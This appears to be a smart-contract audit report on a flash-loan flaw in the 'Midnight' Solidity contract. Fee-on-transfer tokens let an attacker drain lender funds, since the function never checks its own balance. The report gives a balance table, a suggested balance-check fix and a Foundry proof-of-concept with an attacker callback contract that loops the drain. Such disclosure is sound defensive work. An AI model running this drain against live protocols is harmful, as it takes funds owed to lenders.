### Title
Fee-on-Transfer Token Flash Loan Drains Midnight Balance - (File: src/Midnight.sol)

### Summary
The `flashLoan` function in `src/Midnight.sol` transfers exactly `assets[i]` out and then pulls exactly `assets[i]` back, with no pre/post balance check. When the token is a fee-on-transfer ERC20, both legs of the round-trip incur a fee deducted from the receiver, so Midnight's net balance decreases by `assets * fee_rate` per call. An unprivileged attacker who pre-funds the callback by `assets * fee_rate` can repeat this indefinitely, draining the loan token balance that backs lender withdrawals.

### Finding Description

**Exact code path** — `src/Midnight.sol` lines 737–752:

```solidity
function flashLoan(address[] calldata tokens, uint256[] calldata assets, address callback, bytes calldata data)
    external
{
    require(tokens.length == assets.length, InconsistentInput());
    emit EventsLib.FlashLoan(msg.sender, tokens, assets, callback);
    for (uint256 i = 0; i < tokens.length; i++) {
        SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);   // (A)
    }
    require(
        IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
        WrongFlashLoanCallbackReturnValue()
    );
    for (uint256 i = 0; i < tokens.length; i++) {
        SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]); // (B)
    }
}
``` [1](#0-0) 

**Root cause** — `SafeTransferLib.safeTransfer` and `safeTransferFrom` only verify that the call does not revert and that the boolean return value (if any) is `true`. [2](#0-1) 

Neither helper checks that the amount actually credited to the receiver equals `value`. For a fee-on-transfer token where the fee is deducted from the receiver, both calls succeed and return `true`, but each delivers only `assets * (1 - f)` to the destination.

**Attacker-controlled inputs:**
- `tokens[0]` = address of a fee-on-transfer ERC20 that Midnight already holds (e.g., the loan token of an existing market)
- `assets[0]` = any amount ≤ Midnight's current balance
- `callback` = attacker-controlled contract pre-funded with `assets * f` of the same token

**Exploit flow (single iteration, fee rate `f`):**

| Step | Action | Midnight balance | Callback balance |
|------|--------|-----------------|-----------------|
| Start | — | `B` | `assets * f` (pre-funded) |
| (A) `safeTransfer(token, callback, assets)` | Midnight sends `assets`; callback receives `assets*(1-f)` | `B - assets` | `assets*(1-f) + assets*f = assets` |
| callback invoked | no-op | `B - assets` | `assets` |
| (B) `safeTransferFrom(token, callback, this, assets)` | Callback sends `assets`; Midnight receives `assets*(1-f)` | `B - assets*f` | `0` |

Net per call: Midnight loses `assets * f`. The `safeTransferFrom` at step (B) succeeds and returns `true` because the callback has exactly `assets` tokens; the fee is silently taken from Midnight as receiver.

**Why existing checks fail:**
- `safeTransfer` / `safeTransferFrom` check only revert-status and boolean return — not received amount. [3](#0-2) 
- There is no pre/post `balanceOf` guard anywhere in `flashLoan`. [1](#0-0) 
- The Certora solvency spec explicitly axiomatizes this away: *"Assume ERC20 tokens transfer correctly: no fee taking from sender or receiver"* — so the formal proof does not cover this case. [4](#0-3) 

### Impact Explanation
After `N` flash loans each for `assets` tokens, Midnight's balance of the loan token decreases by `N * assets * f`. Because `marketState[id].withdrawable` is not adjusted, the accounting shows lenders are owed more than the contract holds. Lenders who attempt to `withdraw` after the balance is sufficiently drained will find the contract insolvent for that token, violating the core invariant that contract balances cover withdrawable assets. [5](#0-4) 

### Likelihood Explanation
**Preconditions:**
1. A fee-on-transfer ERC20 must be the loan token of at least one Midnight market (so Midnight holds a balance of it). The protocol imposes no token-type restriction on `market.loanToken`.
2. The attacker must pre-fund the callback with `assets * f` tokens per iteration — a real but bounded cost.

**Feasibility:** Any unprivileged address can call `flashLoan` with any token; no role or permission is required. The attack is repeatable as long as Midnight holds a balance. The attacker's cost per iteration equals the damage inflicted (1:1 griefing), making this economically rational only as a targeted attack against lenders, but the protocol provides no defense against it.

### Recommendation
Add a pre/post balance check inside `flashLoan` to enforce strict balance neutrality:

```solidity
for (uint256 i = 0; i < tokens.length; i++) {
    uint256 balanceBefore = IERC20(tokens[i]).balanceOf(address(this));
    SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
    // ... callback ...
    SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
    require(
        IERC20(tokens[i]).balanceOf(address(this)) >= balanceBefore,
        FlashLoanNotRepaid()
    );
}
```

Alternatively, document and enforce at market-creation time that fee-on-transfer tokens are unsupported loan/collateral tokens.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {IFlashLoanCallback} from "src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";

/// @dev Fee-on-transfer token: deducts `feeBps` from receiver on every transfer.
contract FeeOnTransferToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public feeBps; // e.g. 100 = 1%
    constructor(uint256 _feeBps) { feeBps = _feeBps; }
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt; return true;
    }
    function _transfer(address from, address to, uint256 amt) internal {
        balanceOf[from] -= amt;
        uint256 fee = amt * feeBps / 10_000;
        balanceOf[to] += amt - fee; // fee burned / kept by contract
    }
    function transfer(address to, uint256 amt) external returns (bool) {
        _transfer(msg.sender, to, amt); return true;
    }
    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        _transfer(from, to, amt); return true;
    }
}

contract AttackerCallback is IFlashLoanCallback {
    Midnight midnight;
    FeeOnTransferToken token;
    constructor(Midnight _m, FeeOnTransferToken _t) { midnight = _m; token = _t; }
    function onFlashLoan(address, address[] memory, uint256[] memory, bytes memory)
        external returns (bytes32)
    {
        // approve repayment of full `assets` (callback holds assets*(1-f) + pre-funded assets*f = assets)
        token.approve(address(midnight), type(uint256).max);
        return CALLBACK_SUCCESS;
    }
}

contract FeeOnTransferFlashLoanTest is Test {
    uint256 constant FEE_BPS = 100; // 1%
    uint256 constant MIDNIGHT_BALANCE = 1_000_000e18;
    uint256 constant FLASH_AMOUNT = 100_000e18;
    uint256 constant ITERATIONS = 100;

    Midnight midnight;
    FeeOnTransferToken token;
    AttackerCallback callback;

    function setUp() public {
        midnight = new Midnight(/* constructor args */);
        token = new FeeOnTransferToken(FEE_BPS);
        callback = new AttackerCallback(midnight, token);

        // Seed Midnight with loan token balance (simulates lender deposits)
        token.mint(address(midnight), MIDNIGHT_BALANCE);

        // Pre-fund callback for each iteration: assets * f per call
        uint256 prefundPerCall = FLASH_AMOUNT * FEE_BPS / 10_000;
        token.mint(address(callback), prefundPerCall * ITERATIONS);
    }

    function testFeeOnTransferDrainsMidnight() public {
        uint256 balanceBefore = token.balanceOf(address(midnight));

        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_AMOUNT;

        uint256 feePerCall = FLASH_AMOUNT * FEE_BPS / 10_000;

        for (uint256 i = 0; i < ITERATIONS; i++) {
            // Re-fund callback by exactly feePerCall before each call
            // (already pre-funded in setUp for all iterations)
            midnight.flashLoan(tokens, amounts, address(callback), "");
        }

        uint256 balanceAfter = token.balanceOf(address(midnight));

        // Assert: Midnight lost exactly ITERATIONS * feePerCall
        assertEq(
            balanceBefore - balanceAfter,
            ITERATIONS * feePerCall,
            "Midnight drained by fee-on-transfer flash loans"
        );
        // Assert: withdrawable accounting unchanged — contract is now undercollateralized
        // (withdrawable > actual balance)
    }
}
```

**Expected assertions:**
- `balanceBefore - balanceAfter == 100 * FLASH_AMOUNT * FEE_BPS / 10_000` (concrete drain)
- `token.balanceOf(address(midnight)) < sum of all marketState[id].withdrawable` (solvency invariant broken)
